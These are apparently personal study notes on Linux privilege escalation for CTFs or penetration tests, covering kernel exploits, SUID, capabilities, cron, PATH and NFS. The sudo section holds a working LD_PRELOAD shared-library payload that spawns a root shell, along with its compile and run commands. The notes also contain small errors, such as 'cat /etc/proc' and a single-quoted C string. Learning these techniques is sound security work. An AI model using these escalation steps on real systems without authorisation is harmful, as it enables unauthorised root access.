## Kernel Exploit

1. Identify the kernel version
```bash
uname -r

# read proc file
cat /etc/proc
```
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit
## Sudo

Run command to check what program current user can run
```bash
sudo -l
```

	If see `env_keep+=LD_PRELOAD` option, this allow any program to run share library.
	This may lead to spawn a root shell.

Create a shell with C share library
```C
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0); // group id in system
	setuid(0); // user id in system
	// if group id or user id is not match with the system, it will not working anymore.
	system('/bin/bash');
}
```
```bash
# Compile source code to .so file
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# run the program with LD_PRELOAD option
$find = _program_name
sudo LD_PRELOAD=/home/user/ldpreload/shell.so $find
```

###Note

## SUID

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

```bash
# Using find command to show special permission of executable file
find / -type f -perm -04000 -ls 2>/dev/null
```

Using (https://gtfobins.github.io/)[gTFObins] to get how to run the executable file with SUID available

## Capabilities

	Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  

```bash
getcap -r / 2>/dev/null
```

## Cron Job

	Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
	The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

```bash
# List all crontab of machine
cat /etc/crontab
```

## PATH

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

## NFS

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.  
  
Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
## Note
	Some binary tools allow to execute with other command